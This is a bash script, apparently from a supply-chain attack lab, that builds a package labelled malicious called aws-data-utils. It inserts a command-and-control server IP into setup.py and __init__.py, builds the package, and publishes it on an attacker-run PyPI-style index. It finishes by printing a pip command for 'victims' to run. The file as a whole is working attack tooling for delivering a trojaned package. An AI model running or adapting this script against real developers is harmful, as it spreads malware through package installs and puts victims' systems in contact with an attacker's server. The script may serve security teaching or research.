#!/bin/bash
# Build malicious package and upload to attacker's PyPI server

set -e

if [ -z "$1" ]; then
    echo "Usage: $0 <C2_SERVER_IP>"
    echo "Example: $0 192.168.1.100"
    exit 1
fi

C2_IP="$1"
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$DIR"

echo "=========================================="
echo "  Building Malicious Package"
echo "=========================================="
echo ""
echo "[*] Target C2 Server: $C2_IP"
echo ""

# Replace C2 IP in setup.py
echo "[*] Configuring C2 server IP in setup.py..."
sed -i.bak "s/REPLACE_WITH_C2_IP/$C2_IP/g" setup.py
sed -i.bak "s/REPLACE_WITH_C2_IP/$C2_IP/g" aws_data_utils/__init__.py

# Build package
echo "[*] Building package..."
python3 setup.py sdist bdist_wheel 2>&1 | grep -v "warning:" || true

# Restore original files
echo "[*] Restoring original configuration..."
mv setup.py.bak setup.py
mv aws_data_utils/__init__.py.bak aws_data_utils/__init__.py

# Create PyPI simple index structure
echo "[*] Creating PyPI index structure..."
PYPI_DIR="../1-attacker-infrastructure/packages"
SIMPLE_DIR="$PYPI_DIR/simple"
PKG_DIR="$SIMPLE_DIR/aws-data-utils"

mkdir -p "$PKG_DIR"

# Copy built package
echo "[*] Uploading package to PyPI server..."
cp dist/aws-data-utils-*.tar.gz "$PKG_DIR/" 2>/dev/null || true
cp dist/aws_data_utils-*.whl "$PKG_DIR/" 2>/dev/null || true

# Create index.html for the package
cat > "$PKG_DIR/index.html" << EOF
<!DOCTYPE html>
<html>
<head><title>Links for aws-data-utils</title></head>
<body>
<h1>Links for aws-data-utils</h1>
EOF

for file in "$PKG_DIR"/*.tar.gz "$PKG_DIR"/*.whl; do
    if [ -f "$file" ]; then
        filename=$(basename "$file")
        echo "<a href=\"$filename\">$filename</a><br/>" >> "$PKG_DIR/index.html"
    fi
done

echo "</body></html>" >> "$PKG_DIR/index.html"

# Create main simple index
cat > "$SIMPLE_DIR/index.html" << EOF
<!DOCTYPE html>
<html>
<head><title>Simple Index</title></head>
<body>
<h1>Simple Index</h1>
<a href="aws-data-utils/">aws-data-utils</a><br/>
</body>
</html>
EOF

echo ""
echo "[SUCCESS] Package built and uploaded!"
echo ""
echo "Package available at:"
echo "  http://$C2_IP/simple/aws-data-utils/"
echo ""
echo "Victims can install with:"
echo "  pip install --index-url http://$C2_IP/simple/ aws-data-utils"
echo ""
